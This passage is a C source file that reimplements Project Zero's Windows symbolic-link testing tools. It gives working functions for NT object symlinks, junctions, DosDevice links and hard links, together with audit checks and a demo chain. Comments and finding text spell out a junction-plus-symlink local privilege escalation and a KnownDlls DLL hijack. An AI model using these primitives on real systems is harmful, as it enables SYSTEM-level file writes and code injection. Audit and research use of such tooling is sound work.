/*
 * symlink_primitives.c — NT Symbolic Link / Junction / DosDevice / Hard Link Primitives
 *
 * C reimplementation of James Forshaw's symboliclink-testing-tools (Project Zero)
 * https://github.com/googleprojectzero/symboliclink-testing-tools
 *
 * WHAT THIS COVERS:
 *   1. NT Object Manager symbolic links (NtCreateSymbolicLinkObject)
 *      Path: \??\  \Global??\  \RPC Control\  \BaseNamedObjects\
 *      Used by: the BaitAndSwitch race technique, DLL hijack via junction+symlink chain
 *
 *   2. NTFS Junction points (FSCTL_SET_REPARSE_POINT, IO_REPARSE_TAG_MOUNT_POINT)
 *      Directory → NT namespace path (\??\Volume{...} or \??\C:\target)
 *      Used by: redirect a directory that SYSTEM writes to
 *
 *   3. DosDevice symlinks (DefineDosDeviceW with DDD_RAW_TARGET_PATH)
 *      Maps drive letter or device name → NT path without admin rights
 *      Used by: redirect \??\C:\some\path to \??\C:\windows\system32\
 *
 *   4. Hard links (CreateHardLinkW)
 *      Different path, same file data — trick SYSTEM into reading attacker-controlled data
 *      from what looks like a trusted path
 *
 *   5. Object namespace enumeration (\RPC Control\, \Global??\, etc.)
 *      List existing symlinks that may be exploitable
 *
 * ATTACK CHAIN (Forshaw's canonical LPE technique):
 *   a. SYSTEM service writes to C:\Users\user\AppData\Temp\foo\bar.dll
 *   b. Attacker:
 *      - Creates junction: C:\Users\user\AppData\Temp\foo\ → \RPC Control\
 *      - Creates NT symlink: \RPC Control\bar.dll → C:\Windows\System32\bar.dll
 *   c. SYSTEM service writes through junction → follows NT symlink → writes to System32
 *   d. Attacker has arbitrary SYSTEM write → DLL planted in System32 → LPE
 *
 * REFERENCES:
 *   James Forshaw: "Abusing Windows Symbolic Links" (DEF CON 23)
 *   Project Zero blog: "Windows Exploitation Tricks: Arbitrary Directory Creation"
 *   https://googleprojectzero.blogspot.com/2015/12/
 *   CVE-2020-0668: Windows Service Tracing arbitrary file move (Forshaw)
 *   CVE-2019-0841: Windows AppX service symlink LPE (Forshaw)
 *   MITRE T1574.010 — Services File Permissions Weakness
 */

#include "../common.h"
#include <winioctl.h>

/* -----------------------------------------------------------------------
 * NT API declarations (not in standard SDK headers)
 * --------------------------------------------------------------------- */
typedef NTSTATUS (NTAPI *pfnNtCreateSymbolicLinkObject)(
    PHANDLE            LinkHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PUNICODE_STRING    LinkTarget);

typedef NTSTATUS (NTAPI *pfnNtOpenSymbolicLinkObject)(
    PHANDLE            LinkHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes);

typedef NTSTATUS (NTAPI *pfnNtQuerySymbolicLinkObject)(
    HANDLE          LinkHandle,
    PUNICODE_STRING LinkTarget,
    PULONG          ReturnedLength);

typedef NTSTATUS (NTAPI *pfnNtDeleteSymbolicLinkObject)(
    HANDLE LinkHandle);

typedef NTSTATUS (NTAPI *pfnNtCreateDirectoryObject)(
    PHANDLE            DirectoryHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes);

typedef NTSTATUS (NTAPI *pfnNtOpenDirectoryObject)(
    PHANDLE            DirectoryHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes);

typedef struct _OBJECT_DIRECTORY_INFORMATION {
    UNICODE_STRING Name;
    UNICODE_STRING TypeName;
} OBJECT_DIRECTORY_INFORMATION, *POBJECT_DIRECTORY_INFORMATION;

typedef NTSTATUS (NTAPI *pfnNtQueryDirectoryObject)(
    HANDLE    DirectoryHandle,
    PVOID     Buffer,
    ULONG     BufferLength,
    BOOLEAN   ReturnSingleEntry,
    BOOLEAN   RestartScan,
    PULONG    Context,
    PULONG    ReturnLength);

/* NTSTATUS success macro */
#define NT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)

/* Access rights */
#define SYMBOLIC_LINK_QUERY 0x0001
#define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)
#define DIRECTORY_QUERY   0x0001
#define DIRECTORY_TRAVERSE 0x0002
#define DIRECTORY_CREATE_OBJECT 0x0004
#define DIRECTORY_CREATE_SUBDIRECTORY 0x0008
#define DIRECTORY_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0xF)

/* OBJ_ flags (may be already in winternl.h, guard with ifndef) */
#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE 0x40L
#endif
#ifndef OBJ_PERMANENT
#define OBJ_PERMANENT 0x10L
#endif

/* -----------------------------------------------------------------------
 * NTFS Reparse data buffer (junction point)
 * Not in user-mode SDK headers, must define manually
 * --------------------------------------------------------------------- */
#ifndef IO_REPARSE_TAG_MOUNT_POINT
#define IO_REPARSE_TAG_MOUNT_POINT 0xA0000003L
#endif

typedef struct _REPARSE_DATA_BUFFER {
    ULONG  ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    union {
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            WCHAR  PathBuffer[1];
        } MountPointReparseBuffer;
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            ULONG  Flags;
            WCHAR  PathBuffer[1];
        } SymbolicLinkReparseBuffer;
        struct {
            UCHAR DataBuffer[1];
        } GenericReparseBuffer;
    };
} REPARSE_DATA_BUFFER, *PREPARSE_DATA_BUFFER;

#define REPARSE_DATA_BUFFER_HEADER_SIZE \
    FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer)

/* -----------------------------------------------------------------------
 * Load NT API function pointers
 * --------------------------------------------------------------------- */
static pfnNtCreateSymbolicLinkObject  g_NtCreateSymbolicLink  = NULL;
static pfnNtOpenSymbolicLinkObject    g_NtOpenSymbolicLink    = NULL;
static pfnNtQuerySymbolicLinkObject   g_NtQuerySymbolicLink   = NULL;
static pfnNtDeleteSymbolicLinkObject  g_NtDeleteSymbolicLink  = NULL;
static pfnNtCreateDirectoryObject     g_NtCreateDirectory     = NULL;
static pfnNtOpenDirectoryObject       g_NtOpenDirectory       = NULL;
static pfnNtQueryDirectoryObject      g_NtQueryDirectory      = NULL;

static BOOL LoadNTAPIs(void) {
    if (g_NtCreateSymbolicLink) return TRUE;  /* already loaded */

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;

    g_NtCreateSymbolicLink = (pfnNtCreateSymbolicLinkObject)
        GetProcAddress(hNtdll, "NtCreateSymbolicLinkObject");
    g_NtOpenSymbolicLink   = (pfnNtOpenSymbolicLinkObject)
        GetProcAddress(hNtdll, "NtOpenSymbolicLinkObject");
    g_NtQuerySymbolicLink  = (pfnNtQuerySymbolicLinkObject)
        GetProcAddress(hNtdll, "NtQuerySymbolicLinkObject");
    g_NtDeleteSymbolicLink = (pfnNtDeleteSymbolicLinkObject)
        GetProcAddress(hNtdll, "NtMakeTemporaryObject"); /* standard delete mechanism */
    g_NtCreateDirectory    = (pfnNtCreateDirectoryObject)
        GetProcAddress(hNtdll, "NtCreateDirectoryObject");
    g_NtOpenDirectory      = (pfnNtOpenDirectoryObject)
        GetProcAddress(hNtdll, "NtOpenDirectoryObject");
    g_NtQueryDirectory     = (pfnNtQueryDirectoryObject)
        GetProcAddress(hNtdll, "NtQueryDirectoryObject");

    return (g_NtCreateSymbolicLink && g_NtOpenSymbolicLink &&
            g_NtQuerySymbolicLink  && g_NtCreateDirectory &&
            g_NtOpenDirectory      && g_NtQueryDirectory);
}

/* -----------------------------------------------------------------------
 * Helper: init UNICODE_STRING from wchar_t literal
 * --------------------------------------------------------------------- */
static void InitUnicodeString(UNICODE_STRING *us, LPCWSTR str) {
    us->Buffer        = (PWSTR)str;
    us->Length        = (USHORT)(wcslen(str) * sizeof(WCHAR));
    us->MaximumLength = us->Length + sizeof(WCHAR);
}

/* -----------------------------------------------------------------------
 * 1. CREATE NT OBJECT SYMLINK
 *    linkDir  = NT namespace directory, e.g. L"\\RPC Control"
 *    linkName = name inside that dir, e.g. L"target.dll"
 *    target   = NT path the symlink resolves to, e.g. L"\\??\\C:\\Windows\\evil.dll"
 * --------------------------------------------------------------------- */
BOOL CreateNTSymlink(LPCWSTR linkDir, LPCWSTR linkName,
                     LPCWSTR target, HANDLE *hLinkOut) {
    if (!LoadNTAPIs()) return FALSE;

    /* Open the parent directory */
    UNICODE_STRING usDirName;
    InitUnicodeString(&usDirName, linkDir);

    OBJECT_ATTRIBUTES oaDir;
    InitializeObjectAttributes(&oaDir, &usDirName,
                               OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hDir = NULL;
    NTSTATUS st = g_NtOpenDirectory(&hDir, DIRECTORY_ALL_ACCESS, &oaDir);
    if (!NT_SUCCESS(st)) {
        /* Try to create the directory (e.g. \RPC Control already exists,
           but a custom one under \BaseNamedObjects may not) */
        st = g_NtCreateDirectory(&hDir, DIRECTORY_ALL_ACCESS, &oaDir);
        if (!NT_SUCCESS(st)) return FALSE;
    }

    /* Create the symlink inside the directory */
    UNICODE_STRING usLinkName, usTarget;
    InitUnicodeString(&usLinkName, linkName);
    InitUnicodeString(&usTarget,   target);

    OBJECT_ATTRIBUTES oaLink;
    InitializeObjectAttributes(&oaLink, &usLinkName,
                               OBJ_CASE_INSENSITIVE, hDir, NULL);

    HANDLE hLink = NULL;
    st = g_NtCreateSymbolicLink(&hLink, SYMBOLIC_LINK_ALL_ACCESS, &oaLink, &usTarget);
    CloseHandle(hDir);

    if (!NT_SUCCESS(st)) return FALSE;
    if (hLinkOut) *hLinkOut = hLink;
    else CloseHandle(hLink);
    return TRUE;
}

/* -----------------------------------------------------------------------
 * 2. QUERY NT SYMLINK TARGET
 * --------------------------------------------------------------------- */
BOOL QueryNTSymlink(LPCWSTR linkDir, LPCWSTR linkName,
                    LPWSTR targetOut, DWORD cchTarget) {
    if (!LoadNTAPIs()) return FALSE;

    UNICODE_STRING usDirName;
    InitUnicodeString(&usDirName, linkDir);
    OBJECT_ATTRIBUTES oaDir;
    InitializeObjectAttributes(&oaDir, &usDirName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hDir = NULL;
    if (!NT_SUCCESS(g_NtOpenDirectory(&hDir, DIRECTORY_QUERY | DIRECTORY_TRAVERSE, &oaDir)))
        return FALSE;

    UNICODE_STRING usLinkName;
    InitUnicodeString(&usLinkName, linkName);
    OBJECT_ATTRIBUTES oaLink;
    InitializeObjectAttributes(&oaLink, &usLinkName, OBJ_CASE_INSENSITIVE, hDir, NULL);

    HANDLE hLink = NULL;
    NTSTATUS st = g_NtOpenSymbolicLink(&hLink, SYMBOLIC_LINK_QUERY, &oaLink);
    CloseHandle(hDir);
    if (!NT_SUCCESS(st)) return FALSE;

    WCHAR buf[1024] = {0};
    UNICODE_STRING usResult = { 0, (USHORT)sizeof(buf), buf };
    ULONG returned = 0;
    st = g_NtQuerySymbolicLink(hLink, &usResult, &returned);
    CloseHandle(hLink);
    if (!NT_SUCCESS(st)) return FALSE;

    wcsncpy(targetOut, buf, cchTarget - 1);
    return TRUE;
}

/* -----------------------------------------------------------------------
 * 3. DELETE NT SYMLINK (make temporary so kernel removes it on handle close)
 * --------------------------------------------------------------------- */
BOOL DeleteNTSymlink(LPCWSTR linkDir, LPCWSTR linkName) {
    if (!LoadNTAPIs()) return FALSE;

    typedef NTSTATUS (NTAPI *pfnNtMakeTemp)(HANDLE);
    pfnNtMakeTemp NtMakeTemp = (pfnNtMakeTemp)
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtMakeTemporaryObject");

    UNICODE_STRING usDirName;
    InitUnicodeString(&usDirName, linkDir);
    OBJECT_ATTRIBUTES oaDir;
    InitializeObjectAttributes(&oaDir, &usDirName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hDir = NULL;
    if (!NT_SUCCESS(g_NtOpenDirectory(&hDir, DIRECTORY_QUERY | DIRECTORY_TRAVERSE, &oaDir)))
        return FALSE;

    UNICODE_STRING usLinkName;
    InitUnicodeString(&usLinkName, linkName);
    OBJECT_ATTRIBUTES oaLink;
    InitializeObjectAttributes(&oaLink, &usLinkName, OBJ_CASE_INSENSITIVE, hDir, NULL);

    HANDLE hLink = NULL;
    NTSTATUS st = g_NtOpenSymbolicLink(&hLink, SYMBOLIC_LINK_ALL_ACCESS, &oaLink);
    CloseHandle(hDir);
    if (!NT_SUCCESS(st)) return FALSE;

    if (NtMakeTemp) NtMakeTemp(hLink); /* mark non-permanent → deleted on close */
    CloseHandle(hLink);
    return TRUE;
}

/* -----------------------------------------------------------------------
 * 4. CREATE NTFS JUNCTION POINT
 *    junctionPath = existing empty directory to convert to junction
 *    targetNTPath = NT path (must start with \??\) e.g. L"\\??\\RPC Control"
 *                   or L"\\??\\C:\\Windows\\System32"
 * --------------------------------------------------------------------- */
BOOL CreateJunctionPoint(LPCWSTR junctionPath, LPCWSTR targetNTPath) {
    /* Open the directory */
    HANDLE hDir = CreateFileW(junctionPath,
        GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
        NULL);
    if (hDir == INVALID_HANDLE_VALUE) return FALSE;

    /* Build reparse buffer */
    size_t subNameLen  = wcslen(targetNTPath) * sizeof(WCHAR);
    size_t printName   = 0; /* empty print name */
    size_t reparseDataLen = sizeof(USHORT)*4 + subNameLen + sizeof(WCHAR)
                          + printName + sizeof(WCHAR);

    BYTE *buf = (BYTE*)calloc(1, REPARSE_DATA_BUFFER_HEADER_SIZE + reparseDataLen);
    if (!buf) { CloseHandle(hDir); return FALSE; }

    PREPARSE_DATA_BUFFER rdb = (PREPARSE_DATA_BUFFER)buf;
    rdb->ReparseTag         = IO_REPARSE_TAG_MOUNT_POINT;
    rdb->ReparseDataLength  = (USHORT)reparseDataLen;
    rdb->Reserved           = 0;

    rdb->MountPointReparseBuffer.SubstituteNameOffset = 0;
    rdb->MountPointReparseBuffer.SubstituteNameLength = (USHORT)subNameLen;
    rdb->MountPointReparseBuffer.PrintNameOffset      = (USHORT)(subNameLen + sizeof(WCHAR));
    rdb->MountPointReparseBuffer.PrintNameLength      = 0;

    memcpy(rdb->MountPointReparseBuffer.PathBuffer, targetNTPath, subNameLen);
    /* null terminator for substitute name already zeroed by calloc */

    DWORD bytesReturned = 0;
    BOOL ok = DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT,
                               buf, (DWORD)(REPARSE_DATA_BUFFER_HEADER_SIZE + reparseDataLen),
                               NULL, 0, &bytesReturned, NULL);
    free(buf);
    CloseHandle(hDir);
    return ok;
}

/* -----------------------------------------------------------------------
 * 5. QUERY JUNCTION TARGET
 * --------------------------------------------------------------------- */
BOOL QueryJunctionTarget(LPCWSTR junctionPath, LPWSTR targetOut, DWORD cchTarget) {
    HANDLE hDir = CreateFileW(junctionPath,
        GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
    if (hDir == INVALID_HANDLE_VALUE) return FALSE;

    BYTE buf[4096] = {0};
    DWORD returned = 0;
    BOOL ok = DeviceIoControl(hDir, FSCTL_GET_REPARSE_POINT,
                               NULL, 0, buf, sizeof(buf), &returned, NULL);
    CloseHandle(hDir);
    if (!ok) return FALSE;

    PREPARSE_DATA_BUFFER rdb = (PREPARSE_DATA_BUFFER)buf;
    if (rdb->ReparseTag != IO_REPARSE_TAG_MOUNT_POINT) return FALSE;

    WCHAR *subName = (WCHAR*)((BYTE*)rdb->MountPointReparseBuffer.PathBuffer
                     + rdb->MountPointReparseBuffer.SubstituteNameOffset);
    DWORD  subLen  = rdb->MountPointReparseBuffer.SubstituteNameLength / sizeof(WCHAR);

    DWORD copyLen = subLen < cchTarget - 1 ? subLen : cchTarget - 1;
    wcsncpy(targetOut, subName, copyLen);
    targetOut[copyLen] = L'\0';
    return TRUE;
}

/* -----------------------------------------------------------------------
 * 6. DELETE JUNCTION POINT (restore directory)
 * --------------------------------------------------------------------- */
BOOL DeleteJunctionPoint(LPCWSTR junctionPath) {
    HANDLE hDir = CreateFileW(junctionPath,
        GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
    if (hDir == INVALID_HANDLE_VALUE) return FALSE;

    REPARSE_DATA_BUFFER rdb = {0};
    rdb.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    DWORD returned = 0;
    BOOL ok = DeviceIoControl(hDir, FSCTL_DELETE_REPARSE_POINT,
                               &rdb, REPARSE_DATA_BUFFER_HEADER_SIZE,
                               NULL, 0, &returned, NULL);
    CloseHandle(hDir);
    return ok;
}

/* -----------------------------------------------------------------------
 * 7. CREATE DOSDEVICE SYMLINK (user-mode, no admin needed)
 *    Maps \??\<name> → targetNTPath without requiring SeCreateSymbolicLinkPrivilege
 *    Works because DefineDosDevice creates per-session DosDevice entries
 *    visible only to this user session.
 *
 *    Example:
 *      CreateDosDeviceLink(L"ToolsDir", L"\\??\\C:\\Windows\\System32")
 *    → \??\ToolsDir now points to C:\Windows\System32
 *    → CreateFile(L"\\\\.\\ToolsDir\\calc.exe") opens System32\calc.exe
 * --------------------------------------------------------------------- */
BOOL CreateDosDeviceLink(LPCWSTR name, LPCWSTR targetNTPath) {
    return DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
                            name, targetNTPath);
}

BOOL DeleteDosDeviceLink(LPCWSTR name, LPCWSTR targetNTPath) {
    return DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_REMOVE_DEFINITION |
                            DDD_EXACT_MATCH_ON_REMOVE | DDD_NO_BROADCAST_SYSTEM,
                            name, targetNTPath);
}

/* -----------------------------------------------------------------------
 * 8. CREATE HARD LINK
 *    Hard links bypass some path checks: SYSTEM writes to trusted path,
 *    hard link points attacker-controlled file to same inode.
 * --------------------------------------------------------------------- */
BOOL CreateHardLinkToFile(LPCWSTR linkPath, LPCWSTR targetExistingFile) {
    return CreateHardLinkW(linkPath, targetExistingFile, NULL);
}

/* -----------------------------------------------------------------------
 * 9. ENUMERATE NT OBJECT DIRECTORY
 *    Lists all objects (symlinks, mutexes, events, etc.) in an NT directory.
 *    Useful for auditing \RPC Control\, \Global??\, \Sessions\N\BaseNamedObjects\
 * --------------------------------------------------------------------- */
static void EnumNTDirectory(LPCWSTR dirPath, BOOL showSymlinkTargets) {
    if (!LoadNTAPIs()) return;

    UNICODE_STRING usDirPath;
    InitUnicodeString(&usDirPath, dirPath);
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &usDirPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hDir = NULL;
    if (!NT_SUCCESS(g_NtOpenDirectory(&hDir,
            DIRECTORY_QUERY | DIRECTORY_TRAVERSE, &oa))) {
        PrintInfo(L"    Cannot open: %s\n", dirPath);
        return;
    }

    BYTE  buf[65536] = {0};
    ULONG ctx = 0, returned = 0;
    BOOL  first = TRUE;
    DWORD totalSymlinks = 0;

    while (TRUE) {
        NTSTATUS st = g_NtQueryDirectory(hDir, buf, sizeof(buf),
                                          FALSE, first, &ctx, &returned);
        first = FALSE;
        if (st == 0x80000006L /* STATUS_NO_MORE_ENTRIES */ || !NT_SUCCESS(st)) break;

        POBJECT_DIRECTORY_INFORMATION info = (POBJECT_DIRECTORY_INFORMATION)buf;
        while (info->Name.Length) {
            /* null-terminate the strings */
            WCHAR name[512] = {0}, type[128] = {0};
            DWORD nLen = info->Name.Length / sizeof(WCHAR);
            DWORD tLen = info->TypeName.Length / sizeof(WCHAR);
            if (nLen >= _countof(name)) nLen = _countof(name)-1;
            if (tLen >= _countof(type)) tLen = _countof(type)-1;
            wcsncpy(name, info->Name.Buffer, nLen);
            wcsncpy(type, info->TypeName.Buffer, tLen);

            if (showSymlinkTargets && _wcsicmp(type, L"SymbolicLink") == 0) {
                totalSymlinks++;
                /* Resolve target */
                wchar_t target[1024] = {0};
                if (QueryNTSymlink(dirPath, name, target, _countof(target))) {
                    PrintInfo(L"      [SYMLINK] %s → %s\n", name, target);
                } else {
                    PrintInfo(L"      [SYMLINK] %s → (unresolvable)\n", name);
                }
            } else {
                PrintInfo(L"      [%s] %s\n", type, name);
            }
            info++;
        }
    }
    CloseHandle(hDir);
    if (showSymlinkTargets)
        PrintInfo(L"      Total symlinks: %lu\n", totalSymlinks);
}

/* -----------------------------------------------------------------------
 * 10. AUDIT: Find suspicious NT symlinks in key directories
 *     Symlinks redirecting trusted paths to user-controlled locations
 *     could indicate existing compromise or misconfiguration
 * --------------------------------------------------------------------- */
static void AuditGlobalSymlinks(DWORD *findings) {
    PrintInfo(L"  [1] NT Object namespace symlink audit:\n");

    static const struct {
        const wchar_t *dir;
        const wchar_t *desc;
    } NT_DIRS[] = {
        { L"\\??",              L"Global DosDevices (\\??\\ prefix)"  },
        { L"\\Global??",        L"Global DosDevices (\\Global??\\ alternate)" },
        { L"\\RPC Control",     L"RPC Control (used in junction+symlink chain)"  },
        { L"\\KnownDlls",       L"KnownDLLs (DLL hijack via symlink)"            },
        { L"\\KnownDlls32",     L"KnownDLLs32 (32-bit DLL hijack)"               },
        { L"\\BaseNamedObjects", L"Base named objects (mutex/event/section)"      },
        { NULL, NULL }
    };

    for (int di = 0; NT_DIRS[di].dir; di++) {
        PrintInfo(L"\n    Directory: %s (%s)\n", NT_DIRS[di].dir, NT_DIRS[di].desc);
        EnumNTDirectory(NT_DIRS[di].dir,
                        _wcsicmp(NT_DIRS[di].dir, L"\\KnownDlls")  == 0 ||
                        _wcsicmp(NT_DIRS[di].dir, L"\\KnownDlls32")== 0 ||
                        _wcsicmp(NT_DIRS[di].dir, L"\\RPC Control") == 0);
    }
    PrintInfo(L"\n");
}

/* -----------------------------------------------------------------------
 * 11. AUDIT: Check if KnownDLLs directory or entries are writable
 *     Writing to \KnownDlls\{name} = injects DLL into every new process
 *     Normally requires admin/SYSTEM, but misconfigured systems exist
 * --------------------------------------------------------------------- */
static void AuditKnownDLLsWritability(DWORD *findings) {
    PrintInfo(L"  [2] KnownDLLs writability (symlink plant = every process injection):\n");

    if (!LoadNTAPIs()) {
        PrintInfo(L"    Cannot load NT APIs\n\n");
        return;
    }

    static const wchar_t *KNOWN_DLL_DIRS[] = {
        L"\\KnownDlls", L"\\KnownDlls32", NULL
    };

    for (int ki = 0; KNOWN_DLL_DIRS[ki]; ki++) {
        UNICODE_STRING usDirPath;
        InitUnicodeString(&usDirPath, KNOWN_DLL_DIRS[ki]);
        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, &usDirPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

        HANDLE hDir = NULL;
        NTSTATUS st = g_NtOpenDirectory(&hDir, DIRECTORY_ALL_ACCESS, &oa);
        if (NT_SUCCESS(st)) {
            CloseHandle(hDir);
            PrintInfo(L"    [CRITICAL!] %s is WRITABLE with DIRECTORY_ALL_ACCESS!\n",
                      KNOWN_DLL_DIRS[ki]);
            PrintInfo(L"    Planting a symlink here → DLL load from attacker path in ALL processes\n");

            Finding f;
            f.severity = SEV_CRITICAL;
            wcscpy(f.module, L"SYMLINKPRIM");
            _snwprintf(f.target, _countof(f.target),
                L"[WRITABLE] NT KnownDLLs directory: %s", KNOWN_DLL_DIRS[ki]);
            wcscpy(f.reason,
                L"KnownDLLs object directory is writable!\n"
                L"        KnownDLLs entries are loaded as shared sections into EVERY new process.\n"
                L"        Attack: NtCreateSymbolicLinkObject in \\KnownDlls\\target.dll\n"
                L"                pointing to \\??\\C:\\attacker\\evil.dll\n"
                L"        → Every new process that loads target.dll → gets evil.dll instead.\n"
                L"        Impact: Code exec in every new process including SYSTEM processes.");
            PrintFinding(&f);
            (*findings)++;
        } else {
            PrintInfo(L"    %s: not writable (expected, requires SYSTEM)\n", KNOWN_DLL_DIRS[ki]);
        }
    }
    PrintInfo(L"\n");
}

/* -----------------------------------------------------------------------
 * 12. AUDIT: \RPC Control\ writability
 *     This directory is the key ingredient for junction+symlink LPE chain.
 *     Must be writable by attacker to create the NT symlink step.
 * --------------------------------------------------------------------- */
static void AuditRPCControlWritability(DWORD *findings) {
    PrintInfo(L"  [3] \\RPC Control\\ directory writability (junction+symlink chain key):\n");

    if (!LoadNTAPIs()) return;

    UNICODE_STRING us;
    InitUnicodeString(&us, L"\\RPC Control");
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hDir = NULL;
    NTSTATUS st = g_NtOpenDirectory(&hDir, DIRECTORY_CREATE_OBJECT, &oa);
    if (NT_SUCCESS(st)) {
        CloseHandle(hDir);
        PrintInfo(L"    [OK] \\RPC Control\\ allows object creation for current user\n");
        PrintInfo(L"    → Junction+symlink LPE chain IS viable on this system\n\n");

        Finding f;
        f.severity = SEV_MEDIUM; /* INFO/surface confirmation */
        wcscpy(f.module, L"SYMLINKPRIM");
        wcscpy(f.target, L"[VIABLE] \\RPC Control\\ writable — junction+symlink chain available");
        wcscpy(f.reason,
            L"Current user can create objects in \\RPC Control\\.\n"
            L"        This is required for the Forshaw junction+symlink LPE technique:\n"
            L"          1. Junction: C:\\writable\\dir → \\RPC Control\\\n"
            L"          2. NT symlink: \\RPC Control\\target.dll → \\??\\C:\\Windows\\System32\\evil.dll\n"
            L"          3. SYSTEM service writes/reads through junction → follows symlink\n"
            L"          4. → Arbitrary file write/read as SYSTEM\n"
            L"        Combine with --OPLOCKRACE to win the race for TOCTOU targets.");
        PrintFinding(&f);
        (*findings)++;
    } else {
        PrintInfo(L"    \\RPC Control\\: cannot create objects (NTSTATUS=%08X)\n\n", (DWORD)st);
    }
}

/* -----------------------------------------------------------------------
 * 13. DEMONSTRATE: Full junction+symlink chain setup (test only)
 *     Creates the chain and immediately cleans up
 * --------------------------------------------------------------------- */
static void DemoJunctionSymlinkChain(void) {
    PrintInfo(L"  [4] Junction+symlink chain viability test:\n");

    if (!LoadNTAPIs()) {
        PrintInfo(L"    NT APIs unavailable\n\n");
        return;
    }

    /* Create a temp directory to use as junction source */
    wchar_t tempDir[MAX_PATH * 2] = {0};
    wchar_t tempPath[MAX_PATH]    = {0};
    GetTempPathW(_countof(tempPath), tempPath);
    _snwprintf(tempDir, _countof(tempDir), L"%s\\FerumSymTest_%lu",
               tempPath, GetCurrentProcessId());

    BOOL junctionCreated = FALSE, symlinkCreated = FALSE;
    HANDLE hSymlink = NULL;

    /* 1. Create temp directory */
    if (!CreateDirectoryW(tempDir, NULL)) {
        PrintInfo(L"    Cannot create temp directory (skipping demo)\n\n");
        return;
    }

    /* 2. Create NT symlink in \RPC Control\ */
    const wchar_t *LINK_NAME   = L"FerumTest_Link";
    const wchar_t *LINK_TARGET = L"\\??\\C:\\Windows\\System32";

    symlinkCreated = CreateNTSymlink(L"\\RPC Control", LINK_NAME, LINK_TARGET, &hSymlink);
    if (symlinkCreated) {
        PrintInfo(L"    [+] NT symlink created: \\RPC Control\\%s → %s\n",
                  LINK_NAME, LINK_TARGET);
    } else {
        PrintInfo(L"    [-] Cannot create NT symlink in \\RPC Control\\\n");
    }

    /* 3. Create junction: tempDir → \RPC Control */
    junctionCreated = CreateJunctionPoint(tempDir, L"\\RPC Control");
    if (junctionCreated) {
        PrintInfo(L"    [+] Junction created: %s → \\RPC Control\\\n", tempDir);
    } else {
        PrintInfo(L"    [-] Cannot create junction\n");
    }

    /* 4. Verify chain resolves */
    if (junctionCreated && symlinkCreated) {
        wchar_t testPath[MAX_PATH * 2] = {0};
        _snwprintf(testPath, _countof(testPath), L"%s\\%s\\calc.exe",
                   tempDir, LINK_NAME);
        BOOL resolves = (GetFileAttributesW(testPath) != INVALID_FILE_ATTRIBUTES);
        PrintInfo(L"    [%s] Full chain %s\\%s\\calc.exe %s\n",
                  resolves ? L"CONFIRMED" : L"PARTIAL",
                  tempDir, LINK_NAME,
                  resolves ? L"→ resolves to System32\\calc.exe [CHAIN WORKS!]"
                           : L"→ did not resolve (may need SeCreateSymbolicLinkPrivilege)");
    }

    /* 5. Cleanup */
    if (junctionCreated) DeleteJunctionPoint(tempDir);
    RemoveDirectoryW(tempDir);
    if (hSymlink) {
        typedef NTSTATUS (NTAPI *pfnNtMakeTemp)(HANDLE);
        pfnNtMakeTemp f = (pfnNtMakeTemp)
            GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtMakeTemporaryObject");
        if (f) f(hSymlink);
        CloseHandle(hSymlink);
    }
    if (!symlinkCreated && !junctionCreated) {
        DeleteNTSymlink(L"\\RPC Control", LINK_NAME);
    }
    PrintInfo(L"    [*] Cleaned up test artifacts\n\n");
}

/* -----------------------------------------------------------------------
 * 14. DOSDEVICE LINK AUDIT: enumerate DefineDosDevice entries
 *     Malware and some tools create persistent DosDevice links
 * --------------------------------------------------------------------- */
static void AuditDosDeviceLinks(void) {
    PrintInfo(L"  [5] DosDevice symlink enumeration (\\??\\ namespace):\n");
    PrintInfo(L"      Listing drive letters and device mappings:\n");

    /* QueryDosDevice with NULL enumerates all DosDevice names */
    WCHAR buf[65536] = {0};
    DWORD len = QueryDosDeviceW(NULL, buf, _countof(buf));
    if (!len) {
        PrintInfo(L"      QueryDosDeviceW failed (err=%lu)\n\n", GetLastError());
        return;
    }

    DWORD count = 0, suspCount = 0;
    WCHAR *p = buf;
    while (*p) {
        wchar_t target[512] = {0};
